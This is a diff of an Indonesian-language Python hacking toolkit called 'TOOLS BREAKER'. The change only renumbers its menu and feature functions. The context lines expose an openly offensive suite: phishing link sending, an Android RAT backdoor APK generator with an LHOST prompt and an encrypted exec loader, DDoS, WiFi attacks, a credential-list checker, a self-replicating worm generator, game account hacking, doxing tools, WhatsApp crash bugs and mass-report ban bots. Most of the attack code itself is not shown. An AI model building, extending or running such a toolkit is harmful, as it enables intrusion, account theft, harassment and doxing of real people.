@@ -406,9 +406,7 @@ def print_banner(uid, plan):
        ║         TOOLS BREAKER v1.0         ║
        ╚════════════════════════════════════╝
 {Style.RESET_ALL}Tools oleh Mr.Foock | ID: {uid} | Plan: {plan}
-Lokasi: Jakarta, ID | Waktu: {CURRENT_TIME}
-Mode: LOCAL (TANPA VPS) | Semua data disimpan lokal
-""", None))
+Lokasi: Jakarta, ID | Waktu: {CURRENT_TIME}""", None))
 
 # ================== SAVE LOCAL ONLY ==================
 def save_result(filename, content):
@@ -525,10 +523,10 @@ def fitur_1():
     save_result("phising.log", f"Target: {target} | Template: {name} | Link: {phishing_link}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 20: RAT BUAT APK ==================
-def fitur_20():
+# ================== FITUR 13: RAT BUAT APK ==================
+def fitur_13():
     os.system('clear')
-    print(colored("\n[20] RAT - BUAT APK ANDROID", 'cyan', attrs=['bold']))
+    print(colored("\n[13] RAT - BUAT APK ANDROID", 'cyan', attrs=['bold']))
     print(colored("   [GENERATE APK BACKDOOR OTOMATIS]", 'red'))
     
     ip = input(colored("LHOST (IP Anda): ", 'yellow')).strip()
@@ -604,10 +602,10 @@ exec(cipher.decrypt(encrypted).decode())''')
     save_result("rat.log", f"IP: {ip} | Port: {port}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 3: DDOS ALL IN ONE ==================
-def fitur_3():
+# ================== FITUR 2: DDOS ALL IN ONE ==================
+def fitur_2():
     os.system('clear')
-    print(colored("\n[3] DDOS ALL IN ONE", 'cyan', attrs=['bold']))
+    print(colored("\n[2] DDOS ALL IN ONE", 'cyan', attrs=['bold']))
     print(colored("   [PILIH JENIS SERANGAN DDOS]", 'red'))
     
     print(colored("\nPilih tipe DDOS:", 'cyan'))
@@ -1091,10 +1089,10 @@ def fitur_3():
     save_result("ddos.log", f"Type: {choice} | Target: {target if 'target' in locals() else server if 'server' in locals() else 'N/A'}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 21: OSINT & TRACKING ==================
-def fitur_21():
+# ================== FITUR 14: OSINT & TRACKING ==================
+def fitur_14():
     os.system('clear')
-    print(colored("\n[21] OSINT & TRACKING", 'cyan', attrs=['bold']))
+    print(colored("\n[14] OSINT & TRACKING", 'cyan', attrs=['bold']))
     print(colored("   [INFORMATION GATHERING]", 'yellow'))
     
     target = input(colored("Target (username/email/phone): ", 'yellow')).strip()
@@ -1305,10 +1303,10 @@ def fitur_21():
     save_result("osint.log", f"Target: {target} | Type: {osint_types[choice][0]}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 5: IMAGE TOOLS ==================
-def fitur_5():
+# ================== FITUR 3: IMAGE TOOLS ==================
+def fitur_3():
     os.system('clear')
-    print(colored("\n[5] IMAGE TOOLS", 'cyan', attrs=['bold']))
+    print(colored("\n[3] IMAGE TOOLS", 'cyan', attrs=['bold']))
     print(colored("   [MANIPULASI GAMBAR]", 'yellow'))
     
     if not PILLOW_AVAILABLE:
@@ -1485,10 +1483,10 @@ def fitur_5():
     
     input("\nPress Enter to continue...")
 
-# ================== FITUR 22: ENCRYPT & DECRYPT ==================
-def fitur_22():
+# ================== FITUR 15: ENCRYPT & DECRYPT ==================
+def fitur_15():
     os.system('clear')
-    print(colored("\n[22] ENCRYPT & DECRYPT", 'cyan', attrs=['bold']))
+    print(colored("\n[15] ENCRYPT & DECRYPT", 'cyan', attrs=['bold']))
     print(colored("   [KRIPTOGRAFI]", 'yellow'))
     
     if not CRYPTO_AVAILABLE:
@@ -1618,10 +1616,10 @@ def fitur_22():
     save_result("crypto.log", f"Operation: {choice}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 7: EXPLOIT & SCANNER ==================
-def fitur_7():
+# ================== FITUR 4: EXPLOIT & SCANNER ==================
+def fitur_4():
     os.system('clear')
-    print(colored("\n[7] EXPLOIT & SCANNER", 'cyan', attrs=['bold']))
+    print(colored("\n[4] EXPLOIT & SCANNER", 'cyan', attrs=['bold']))
     print(colored("   [VULNERABILITY SCANNER]", 'yellow'))
     
     target = input(colored("Target URL/IP: ", 'yellow')).strip()
@@ -1844,10 +1842,10 @@ def fitur_7():
     save_result("exploit.log", f"Target: {target} | Scan: {choice}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 23: WHATSAPP INVITE ==================
-def fitur_23():
+# ================== FITUR 16: WHATSAPP INVITE ==================
+def fitur_16():
     os.system('clear')
-    print(colored("\n[23] WHATSAPP INVITE", 'cyan', attrs=['bold']))
+    print(colored("\n[16] WHATSAPP INVITE", 'cyan', attrs=['bold']))
     print(colored("   [GENERATE LINK WA]", 'yellow'))
     
     phone = input(colored("Nomor target (628xxx): ", 'yellow')).strip()
@@ -1907,10 +1905,10 @@ def fitur_23():
     save_result("whatsapp.log", f"Target: {phone} | Link: {link}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 9: DASHBOARD ==================
-def fitur_9():
+# ================== FITUR 5: DASHBOARD ==================
+def fitur_5():
     os.system('clear')
-    print(colored("\n[9] DASHBOARD", 'cyan', attrs=['bold']))
+    print(colored("\n[5] DASHBOARD", 'cyan', attrs=['bold']))
     print(colored("   [STATISTIK SISTEM]", 'yellow'))
     
     print(colored("\n[SISTEM]", 'magenta'))
@@ -1972,15 +1970,15 @@ def fitur_9():
     save_result("dashboard.log", f"Dashboard accessed at {datetime.now()}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 24: DEVTOOLS ==================
-def fitur_24():
+# ================== FITUR 17: DEVTOOLS ==================
+def fitur_17():
     if not IS_DEVELOPER:
         print(colored("[ERROR] Hanya untuk developer!", 'red'))
         input("\nEnter...")
         return
     
     os.system('clear')
-    print(colored("\n[24] DEVTOOLS", 'cyan', attrs=['bold']))
+    print(colored("\n[17] DEVTOOLS", 'cyan', attrs=['bold']))
     
     print(colored("\nPilih:", 'cyan'))
     print("1. View tokens.json")
@@ -2058,10 +2056,10 @@ def fitur_24():
     
     input("\nEnter...")
 
-# ================== FITUR 11: TRACK NIK ==================
-def fitur_11():
+# ================== FITUR 6: TRACK NIK ==================
+def fitur_6():
     os.system('clear')
-    print(colored("\n[11] TRACK NIK", 'cyan', attrs=['bold']))
+    print(colored("\n[6] TRACK NIK", 'cyan', attrs=['bold']))
     print(colored("   [DEKODE NOMOR INDUK KEPENDUDUKAN]", 'yellow'))
     
     nik = input(colored("Masukkan NIK (16 digit): ", 'yellow')).strip()
@@ -2133,10 +2131,10 @@ def fitur_11():
     save_result("nik.log", f"NIK: {nik} | Prov: {prov_code} | Gender: {gender}")
     input("\nEnter untuk kembali...")
 
-# ================== FITUR 25: SPAM ALL ==================
-def fitur_25():
+# ================== FITUR 18: SPAM ALL ==================
+def fitur_18():
     os.system('clear')
-    print(colored("\n[25] SPAM ALL", 'cyan', attrs=['bold']))
+    print(colored("\n[18] SPAM ALL", 'cyan', attrs=['bold']))
     print(colored("   [SIMPLE SPAMMER - GUNAKAN DENGAN BIJAK]", 'red'))
     
     target = input(colored("Nomor target (628xx): ", 'yellow')).strip()
@@ -2171,10 +2169,10 @@ def fitur_25():
     save_result("spam.log", f"Target: {target} | Count: {count}")
     input("\nEnter untuk kembali...")
 
-# ================== FITUR 13: WIFI ATTACK ==================
-def fitur_13():
+# ================== FITUR 7: WIFI ATTACK ==================
+def fitur_7():
     os.system('clear')
-    print(colored("\n[13] WIFI ATTACK", 'cyan', attrs=['bold']))
+    print(colored("\n[7] WIFI ATTACK", 'cyan', attrs=['bold']))
     print(colored("   [REQUIRES ROOT & AIRCRACK-NG]", 'red'))
     
     # Cek aircrack-ng
@@ -2234,10 +2232,10 @@ def fitur_13():
     
     input("\nEnter untuk kembali...")
 
-# ================== FITUR 26: CHECKER ALL ==================
-def fitur_26():
+# ================== FITUR 19: CHECKER ALL ==================
+def fitur_19():
     os.system('clear')
-    print(colored("\n[26] CHECKER ALL", 'cyan', attrs=['bold']))
+    print(colored("\n[19] CHECKER ALL", 'cyan', attrs=['bold']))
     print(colored("   [SIMPLE ACCOUNT VALIDATOR]", 'yellow'))
     
     file = input("File list (format: email:password per baris): ").strip()
@@ -2287,10 +2285,10 @@ def fitur_26():
     
     input("\nEnter untuk kembali...")
 
-# ================== FITUR 15: WORM GPT ==================
-def fitur_15():
+# ================== FITUR 8: WORM GPT ==================
+def fitur_8():
     os.system('clear')
-    print(colored("\n[15] WORM GPT", 'cyan', attrs=['bold']))
+    print(colored("\n[8] WORM GPT", 'cyan', attrs=['bold']))
     print(colored("   [SELF-REPLICATING SCRIPT GENERATOR]", 'red'))
     
     name = input("Nama worm [worm]: ").strip() or "worm"
@@ -2399,10 +2397,10 @@ while True:
     save_result("worm.log", f"Worm: {filename}")
     input("\nEnter untuk kembali...")
 
-# ================== FITUR 27: HACK AKUN GAME ==================
-def fitur_27():
+# ================== FITUR 20: HACK AKUN GAME ==================
+def fitur_20():
     os.system('clear')
-    print(colored("\n[27] HACK AKUN GAME", 'cyan', attrs=['bold']))
+    print(colored("\n[20] HACK AKUN GAME", 'cyan', attrs=['bold']))
     print(colored("   [AKSES AKUN GAME VIA EXPLOIT]", 'red'))
     
     print("Pilih game:")
@@ -2488,10 +2486,10 @@ def fitur_27():
     save_result("game_hack.log", f"Game: {game['name']} | Target: {target_id}")
     input("\nEnter untuk kembali...")
 
-# ================== FITUR 17: REPORT TIKTOK ==================
-def fitur_16():
+# ================== FITUR 9: REPORT TIKTOK ==================
+def fitur_9():
     os.system('clear')
-    print(colored("\n[17] REPORT TIKTOK", 'cyan', attrs=['bold']))
+    print(colored("\n[9] REPORT TIKTOK", 'cyan', attrs=['bold']))
     print(colored("   [REPORT BOT]", 'red'))
     
     username = input("Username target (tanpa @): ").strip()
@@ -2531,10 +2529,10 @@ def fitur_16():
     save_result("tiktok_report.log", f"Target: @{username} | Count: {count} | Success: {success}")
     input("\nEnter untuk kembali...")
 
-# ================== FITUR 28: DOX BASIC ==================
-def fitur_28():
+# ================== FITUR 21: DOX BASIC ==================
+def fitur_21():
     os.system('clear')
-    print(colored("\n[28] DOX gk akurat", 'cyan', attrs=['bold']))
+    print(colored("\n[21] DOX gk akurat", 'cyan', attrs=['bold']))
     print(colored("   [INFORMASI DASAR DARI NOMOR/USERNAME]", 'yellow'))
     
     target = input(colored("Masukkan nomor awal 62/username: ", 'yellow')).strip()
@@ -2628,10 +2626,10 @@ def fitur_28():
     save_result("dox_basic.log", f"Target: {target}")
     input("\nEnter untuk kembali...")
 
-# ================== FITUR 17: DOX ADVANCED ==================
-def fitur_17():
+# ================== FITUR 10: DOX ADVANCED ==================
+def fitur_10():
     os.system('clear')
-    print(colored("\n[17] DOX ADVANCED", 'cyan', attrs=['bold']))
+    print(colored("\n[10] DOX ADVANCED", 'cyan', attrs=['bold']))
     print(colored("   [INFORMASI LENGKAP DARI NOMOR/USERNAME]", 'red'))
     
     target = input(colored("Masukkan nomor/username: ", 'yellow')).strip()
@@ -2752,10 +2750,10 @@ def fitur_17():
     save_result("dox_advanced.log", f"Target: {target}")
     input("\nEnter untuk kembali...")
 
-# ================== FITUR 29: BUG WA KIRIM OTOMATIS ==================
-def fitur_29():
+# ================== FITUR 22: BUG WA KIRIM OTOMATIS ==================
+def fitur_22():
     os.system('clear')
-    print(colored("\n[29] BUG WHATSAPP - KIRIM OTOMATIS", 'cyan', attrs=['bold']))
+    print(colored("\n[22] BUG WHATSAPP - KIRIM OTOMATIS", 'cyan', attrs=['bold']))
     print(colored("   [5 JENIS BUG, KIRIM LANGSUNG KE TARGET]", 'red'))
     
     target = input(colored("Nomor target (628xxx): ", 'yellow')).strip()
@@ -2828,10 +2826,10 @@ def fitur_29():
     save_result("wa_bug.log", f"Target: {target} | Bug: {bug_name}")
     input("\nEnter untuk kembali...")
 
-# ================== FITUR 18: BAN WHATSAPP ==================
-def fitur_18():
+# ================== FITUR 11: BAN WHATSAPP ==================
+def fitur_11():
     os.system('clear')
-    print(colored("\n[18] BAN WHATSAPP", 'cyan', attrs=['bold']))
+    print(colored("\n[11] BAN WHATSAPP", 'cyan', attrs=['bold']))
     print(colored("   [REPORT BOT]", 'red'))
     
     number = input("Nomor target (628xx): ").strip()
@@ -2866,10 +2864,10 @@ def fitur_18():
     save_result("wa_ban.log", f"Target: {number} | Count: {count} | Success: {success}")
     input("\nEnter untuk kembali...")
 
-# ================== FITUR 30: UNBAN WHATSAPP ==================
-def fitur_30():
+# ================== FITUR 23: UNBAN WHATSAPP ==================
+def fitur_23():
     os.system('clear')
-    print(colored("\n[30] UNBAN WHATSAPP", 'cyan', attrs=['bold']))
+    print(colored("\n[23] UNBAN WHATSAPP", 'cyan', attrs=['bold']))
     print(colored("   [GENERATE SURAT UNBAN]", 'yellow'))
     
     file = input("File list nomor (satu nomor per baris): ").strip()
@@ -2929,10 +2927,10 @@ Hormat saya,
     
     input("\nEnter untuk kembali...")
 
-# ================== FITUR 19: BAN TIKTOK ==================
-def fitur_19():
+# ================== FITUR 12: BAN TIKTOK ==================
+def fitur_12():
     os.system('clear')
-    print(colored("\n[19] BAN TIKTOK", 'cyan', attrs=['bold']))
+    print(colored("\n[12] BAN TIKTOK", 'cyan', attrs=['bold']))
     print(colored("   [REPORT BOT]", 'red'))
     
     username = input("Username target (tanpa @): ").strip()
@@ -2979,18 +2977,18 @@ def menu_utama(username, plan):
         print(colored("╠════════════════════════════════════════════════════════╣", 'cyan'))
         
         menu_items = [
-            ("1. PHISING KIRIM", "20. RAT BUAT APK"),
-            ("3. DDOS ALL IN ONE", "21. OSINT TRACKING"),
-            ("5. IMAGE TOOLS", "22. ENCRYPT/DECRYPT"),
-            ("7. EXPLOIT SCANNER", "23. WA INVITE"),
-            ("9. DASHBOARD", "24. DEVTOOLS"),
-            ("11. TRACK NIK", "25. SPAM ALL"),
-            ("13. WIFI ATTACK", "26. CHECKER ALL"),
-            ("15. WORM GPT", "27. HACK AKUN GAME"),
-            ("16. REPORT TIKTOK", "28. DOX GK AKURAT"),
-            ("17. DOX AKURAT", "29. BUG WA"),
-            ("18. BAN WA", "30. UNBAN WA"),
-            ("19. BAN TIKTOK", "0. EXIT")
+            ("1. PHISING KIRIM", "13. RAT BUAT APK"),
+            ("2. DDOS ALL IN ONE", "14. OSINT TRACKING"),
+            ("3. IMAGE TOOLS", "15. ENCRYPT/DECRYPT"),
+            ("4. EXPLOIT SCANNER", "16. WA INVITE"),
+            ("5. DASHBOARD", "17. DEVTOOLS"),
+            ("6. TRACK NIK", "18. SPAM ALL"),
+            ("7. WIFI ATTACK", "19. CHECKER ALL"),
+            ("8. WORM GPT", "20. HACK AKUN GAME"),
+            ("9. REPORT TIKTOK", "21. DOX GK AKURAT"),
+            ("10. DOX AKURAT", "22. BUG WA"),
+            ("11. BAN WA", "23. UNBAN WA"),
+            ("12. BAN TIKTOK", "0. EXIT")
         ]
         
         for left, right in menu_items:
